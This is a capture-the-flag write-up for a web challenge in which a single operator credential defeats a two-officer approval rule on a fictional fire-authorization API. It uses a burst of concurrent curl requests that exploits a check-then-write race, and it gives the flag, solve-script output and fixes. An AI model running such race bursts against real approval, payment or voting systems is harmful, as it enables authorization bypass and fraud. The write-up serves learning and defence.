---
tags: [web, race-condition, toctou, api, authorization-bypass]
---

🇬🇧 English · [🇫🇷 Français](README.fr.md)

# Two-Key Turn

| Category | Points | Solves | Solved | First blood | Solved by | Challenge author |
|---|---|---|---|---|---|---|
| web | 120 | 194 | ✅ | — | 0xAr3s-root | Chronos Security |

## Challenge description

> Kessara's coastal fire-authorization console arms a fire order only when two DISTINCT
> officers approve it — the two-person rule. A hostile insider holds one officer's credentials
> (VEGA-7). One order is still awaiting authorization: drive it to ARMED with your single
> credential and read its arming authorization.
>
> The API is self-describing at `GET /schema`. Your operator key is
> `opk_vega7_2f4b9c17e0a3` — send it as `Authorization: Bearer <key>`. Interact only with
> your assigned instance.
>
> Flag format: `CSCTF{...}`

**Target:** a per-player instance at `http://w05.ctf.chronos-security.ro:<port>` (spun up with
a 30-minute TTL).

## TL;DR

The two-person rule's "one approval per officer" check is a classic **TOCTOU race
condition**: firing a burst of concurrent `POST /orders/{id}/approve` requests with the
*same* operator key lets several requests read "0 prior approvals" before any of them
commits its own record. Two of them each write an approval record for `VEGA-7`,
`approvals` reaches `required_approvals = 2`, the order flips to `ARMED`, and the response
carries `arming_authorization` — the flag.

## Approach

**1. Recon — reading the self-describing schema**

```bash
curl -s http://w05.ctf.chronos-security.ro:34125/schema | jq
```

```json
{
  "authorization_model": {
    "two_person_rule": "an order arms only when TWO DISTINCT officers have each cast APPROVE (required_approvals = 2)",
    "approve": "idempotent per officer while an approval window is pending",
    "pending_ttl_seconds": 8.0,
    "concurrent_action": "an ordinary 6-8 separate-connection approval burst is supported"
  },
  "routes": {
    "GET /orders": "list fire orders and retry information",
    "GET /orders/{id}": "order detail; arming_authorization appears only after ARMED",
    "POST /orders/{id}/approve": "cast one approval on the order"
  },
  "your_officer": "VEGA-7",
  "issued_operator_credential": "opk_vega7_2f4b9c17e0a3"
}
```

Two phrases stand out immediately:

- `approve` is **"idempotent per officer while an approval window is pending"** — a
  statement about a *check*, not a guarantee of how it's implemented.
- The server explicitly says it **supports** "an ordinary 6-8 separate-connection approval
  burst" — a strong, almost too-helpful hint that sending several approvals at once on
  separate connections is the intended interaction, and that the server's concurrency
  handling is exactly what's being tested.

**2. Finding the target order**

```bash
curl -s http://w05.ctf.chronos-security.ro:34125/orders \
  -H "Authorization: Bearer opk_vega7_2f4b9c17e0a3"
```

```json
{"orders":[
  {"id":"AO-7D31C9","battery":"Coastal Battery 3 (Saltmarsh)","status":"PENDING_AUTH","approvals":0,"required_approvals":2},
  {"id":"AO-19F4E2","status":"REJECTED", "...":"..."},
  {"id":"AO-A8C506","status":"EXECUTED",  "...":"..."},
  {"id":"AO-CE472A","status":"DRAFT",     "...":"..."}
]}
```

`AO-7D31C9` is the only order `PENDING_AUTH` — our target.

**3. The race**

"Idempotent per officer" almost always means the server does something like:

```
if officer not in order.approved_by:
    order.approved_by.add(officer)
    order.approvals += 1
```

That is a classic **read-check-then-write** (TOCTOU) pattern. If two requests from the
same officer hit the handler concurrently, both can pass the `if` check (reading the same
"not yet approved" state) before either one finishes writing — each then appends its own
approval record, and `approvals` ends up counting the *same* officer twice instead of
being capped at one.

Fire a burst of concurrent approvals from separate connections:

```bash
for i in $(seq 1 8); do
  curl -s -X POST http://w05.ctf.chronos-security.ro:34125/orders/AO-7D31C9/approve \
    -H "Authorization: Bearer opk_vega7_2f4b9c17e0a3" &
done
wait
```

Result — two of the eight requests race past the check before the first write lands:

```json
{"status":"ARMED","approvals":2,"required_approvals":2,
 "approval_records":[
   {"record_id":"APR-1-1","officer":"VEGA-7","epoch":1},
   {"record_id":"APR-1-2","officer":"VEGA-7","epoch":1}
 ],
 "arming_authorization":"CSCTF{02elNslnF7sZtih4zHofPXWB}"}
```

Both approval records belong to `VEGA-7` — the "two distinct officers" rule was bypassed
entirely using a single credential, purely by winning the race within the 8-second pending
window.

Solve script: [`solve/solve.py`](solve/solve.py)

```bash
python3 solve/solve.py http://w05.ctf.chronos-security.ro:34125
```

```
[+] Target order: AO-7D31C9
[+] Firing 8 concurrent approve() requests (race condition)...
[+] Order status : ARMED
[+] Approvals    : 2/2
      - APR-1-1 by VEGA-7 (epoch 1)
      - APR-1-2 by VEGA-7 (epoch 1)
[+] Flag: CSCTF{02elNslnF7sZtih4zHofPXWB}
```

## Flag

`CSCTF{02elNslnF7sZtih4zHofPXWB}`

## Reflections

- The schema practically names the vulnerability class: "idempotent... while pending" is a
  state-check guarantee, and "concurrent action... burst is supported" is an invitation to
  test *how* concurrency is handled, not just *that* it's handled.
- This is the same bug class as double-spend / double-redeem races in payment and voting
  systems: any "has this actor already done X?" check that isn't enforced atomically
  (e.g. a unique constraint at the data layer, or a lock/mutex around the whole
  check-and-increment) can be beaten by parallel requests landing inside the same window.
- The fix is straightforward: enforce "one approval per officer per order" with an atomic
  operation — a DB unique constraint on `(order_id, officer)`, a compare-and-swap, or a
  per-order lock held across the whole check-then-increment — instead of a
  read-then-write pair that leaves a gap for other threads/requests to land in.
- No authentication bypass was needed: the whole exploit uses only the single credential
  we were issued, abusing timing instead of identity.

## Tools & references

- `curl` with background jobs (`&` / `wait`) for a cheap concurrent HTTP burst
- Python `concurrent.futures.ThreadPoolExecutor` for the scripted version
- TOCTOU / race condition fundamentals: [OWASP — Race Condition](https://owasp.org/www-community/vulnerabilities/Race_condition)

---
[⬅ Back to event](../../README.md)
